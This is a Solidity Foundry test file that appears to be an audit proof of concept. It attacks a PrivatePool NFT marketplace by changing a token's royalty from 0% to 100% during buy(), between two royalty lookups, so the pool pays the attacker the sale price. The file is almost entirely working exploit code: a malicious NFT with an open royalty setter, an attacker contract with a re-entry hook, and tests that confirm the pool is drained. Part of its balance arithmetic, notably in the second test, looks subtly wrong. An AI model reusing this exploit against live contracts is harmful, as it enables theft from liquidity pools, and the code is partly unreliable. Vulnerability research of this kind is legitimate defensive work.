// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "forge-std/Test.sol";
import "../src/PrivatePool.sol";
import "../src/Factory.sol";
import "solmate/tokens/ERC721.sol";
import "solmate/tokens/ERC20.sol";
import "openzeppelin/token/common/ERC2981.sol";

/// @title Malicious NFT Contract with Dynamic Royalty Manipulation
/// @notice This contract allows changing royalty fees to exploit the double _getRoyalty() call vulnerability
contract MaliciousNFT is ERC721, ERC2981 {
    uint256 private _tokenIdCounter;
    
    constructor() ERC721("MaliciousNFT", "MNFT") {}
    
    function mint(address to) external returns (uint256) {
        uint256 tokenId = _tokenIdCounter++;
        _mint(to, tokenId);
        return tokenId;
    }
    
    function setTokenRoyalty(uint256 tokenId, address receiver, uint96 feeNumerator) external {
        _setTokenRoyalty(tokenId, receiver, feeNumerator);
    }
    
    function tokenURI(uint256) public pure override returns (string memory) {
        return "";
    }
    
    function supportsInterface(bytes4 interfaceId) public view virtual override(ERC721, ERC2981) returns (bool) {
        return super.supportsInterface(interfaceId);
    }
}

/// @title Attacker Contract
/// @notice This contract exploits the royalty fee manipulation vulnerability in PrivatePool.buy()
contract Attacker {
    MaliciousNFT public nft;
    PrivatePool public pool;
    uint256 public tokenId;
    bool public attacked;
    
    constructor(MaliciousNFT _nft, PrivatePool _pool, uint256 _tokenId) {
        nft = _nft;
        pool = _pool;
        tokenId = _tokenId;
    }
    
    /// @notice Receive function that changes royalty to 100% during the buy() execution
    /// @dev This is called when excess ETH is refunded, between the two _getRoyalty() calls
    receive() external payable {
        // Only execute the attack once to avoid reentrancy issues
        if (!attacked) {
            attacked = true;
            // Change royalty from 0% to 100% (10000 basis points)
            nft.setTokenRoyalty(tokenId, address(this), 10000);
        }
    }
    
    function attack() external payable {
        uint256[] memory tokenIds = new uint256[](1);
        tokenIds[0] = tokenId;
        
        uint256[] memory tokenWeights = new uint256[](1);
        tokenWeights[0] = 1e18;
        
        PrivatePool.MerkleMultiProof memory proof;
        proof.proof = new bytes32[](0);
        proof.flags = new bool[](0);
        
        // Send excess ETH to trigger the refund and our receive() function
        pool.buy{value: msg.value}(tokenIds, tokenWeights, proof);
    }
}

/// @title Royalty Fee Manipulation Exploit Test
/// @notice Demonstrates the vulnerability where royalty fees can be manipulated between two _getRoyalty() calls
contract ExploitTest is Test {
    Factory public factory;
    PrivatePool public pool;
    MaliciousNFT public nft;
    Attacker public attacker;
    
    address public poolOwner = address(0x1);
    address public attackerAddress = address(0x2);
    
    uint256 public constant INITIAL_ETH = 100 ether;
    uint256 public tokenId;
    
    function setUp() public {
        // Deploy factory with required parameters
        factory = new Factory();
        factory.initialize();
        
        // Deploy malicious NFT contract
        nft = new MaliciousNFT();
        
        // Mint NFT to pool owner
        vm.startPrank(poolOwner);
        tokenId = nft.mint(poolOwner);
        
        // Set initial royalty to 0%
        nft.setTokenRoyalty(tokenId, attackerAddress, 0);
        
        // Create private pool with ETH as base token
        pool = PrivatePool(payable(factory.create{value: 0}(
            address(0), // baseToken = ETH
            address(nft), // nft
            100 ether, // virtualBaseTokenReserves
            10 ether, // virtualNftReserves
            0, // changeFee
            200, // feeRate (2%)
            bytes32(0), // merkleRoot (no weights)
            false, // useStolenNftOracle
            true, // payRoyalties - MUST BE TRUE for exploit
            0, // salt
            new uint256[](0), // tokenIds (empty initially)
            0 // baseTokenAmount
        )));
        
        // Approve and deposit NFT into pool
        nft.approve(address(pool), tokenId);
        uint256[] memory depositTokenIds = new uint256[](1);
        depositTokenIds[0] = tokenId;
        pool.deposit(depositTokenIds, 0);
        
        // Fund the pool with ETH
        vm.deal(address(pool), INITIAL_ETH);
        vm.stopPrank();
        
        // Deploy attacker contract
        vm.prank(attackerAddress);
        attacker = new Attacker(nft, pool, tokenId);
        
        // Fund attacker with ETH for the attack
        vm.deal(address(attacker), 20 ether);
    }
    
    /// @notice Test demonstrating the royalty fee manipulation exploit
    /// @dev The attacker buys an NFT with 0% royalty, changes it to 100% mid-transaction,
    ///      and receives the full sale price back as royalty payment from the pool
    function testRoyaltyFeeManipulation() public {
        uint256 poolBalanceBefore = address(pool).balance;
        uint256 attackerBalanceBefore = address(attacker).balance;
        
        console.log("=== Initial State ===");
        console.log("Pool ETH balance:", poolBalanceBefore);
        console.log("Attacker ETH balance:", attackerBalanceBefore);
        console.log("NFT owner:", nft.ownerOf(tokenId));
        
        // Calculate expected costs
        (uint256 netInputAmount, uint256 feeAmount, uint256 protocolFeeAmount) = pool.buyQuote(1e18);
        console.log("\n=== Buy Quote (with 0% royalty) ===");
        console.log("Net input amount:", netInputAmount);
        console.log("Fee amount:", feeAmount);
        console.log("Protocol fee amount:", protocolFeeAmount);
        
        // Execute the attack
        vm.prank(attackerAddress);
        attacker.attack{value: 20 ether}();
        
        uint256 poolBalanceAfter = address(pool).balance;
        uint256 attackerBalanceAfter = address(attacker).balance;
        
        console.log("\n=== After Attack ===");
        console.log("Pool ETH balance:", poolBalanceAfter);
        console.log("Attacker ETH balance:", attackerBalanceAfter);
        console.log("NFT owner:", nft.ownerOf(tokenId));
        
        // Calculate the actual impact
        uint256 poolLoss = poolBalanceBefore - poolBalanceAfter;
        uint256 attackerGain = attackerBalanceAfter - attackerBalanceBefore;
        
        console.log("\n=== Impact ===");
        console.log("Pool lost:", poolLoss);
        console.log("Attacker gained:", attackerGain);
        
        // Verify the exploit succeeded
        // 1. Attacker now owns the NFT
        assertEq(nft.ownerOf(tokenId), address(attacker), "Attacker should own the NFT");
        
        // 2. Pool lost significant ETH (approximately the sale price)
        // The pool should have lost roughly the netInputAmount (excluding fees paid to factory)
        uint256 salePrice = netInputAmount - feeAmount - protocolFeeAmount;
        assertGt(poolLoss, salePrice * 95 / 100, "Pool should have lost approximately the sale price");
        
        // 3. Attacker received the NFT essentially for free (or even profited)
        // The attacker should have spent minimal ETH (only gas + small fees)
        // but received back the full sale price as royalty
        assertLt(attackerBalanceBefore - attackerBalanceAfter, salePrice / 10, "Attacker should have spent minimal ETH");
        
        console.log("\n=== Exploit Successful ===");
        console.log("The attacker acquired the NFT while the pool paid the royalty fee");
        console.log("This demonstrates the double _getRoyalty() call vulnerability");
    }
    
    /// @notice Test showing the attack fails when payRoyalties is false
    function testExploitFailsWhenRoyaltiesDisabled() public {
        // Create a new pool with payRoyalties = false
        vm.startPrank(poolOwner);
        
        uint256 newTokenId = nft.mint(poolOwner);
        nft.setTokenRoyalty(newTokenId, attackerAddress, 0);
        
        PrivatePool safePool = PrivatePool(payable(factory.create{value: 0}(
            address(0),
            address(nft),
            100 ether,
            10 ether,
            0,
            200,
            bytes32(0),
            false,
            false, // payRoyalties = FALSE
            1, // different salt
            new uint256[](0),
            0
        )));
        
        nft.approve(address(safePool), newTokenId);
        uint256[] memory depositTokenIds = new uint256[](1);
        depositTokenIds[0] = newTokenId;
        safePool.deposit(depositTokenIds, 0);
        
        vm.deal(address(safePool), INITIAL_ETH);
        vm.stopPrank();
        
        uint256 poolBalanceBefore = address(safePool).balance;
        
        // Try to attack
        vm.startPrank(attackerAddress);
        Attacker safeAttacker = new Attacker(nft, safePool, newTokenId);
        vm.deal(address(safeAttacker), 20 ether);
        safeAttacker.attack{value: 20 ether}();
        vm.stopPrank();
        
        uint256 poolBalanceAfter = address(safePool).balance;
        
        // Pool should only lose the normal amount (no royalty manipulation)
        (uint256 netInputAmount,,) = safePool.buyQuote(1e18);
        uint256 poolLoss = poolBalanceBefore - poolBalanceAfter;
        
        // Pool loss should be minimal (just the refunded excess)
        assertLt(poolLoss, netInputAmount / 10, "Pool should not lose significant funds when royalties disabled");
    }
}
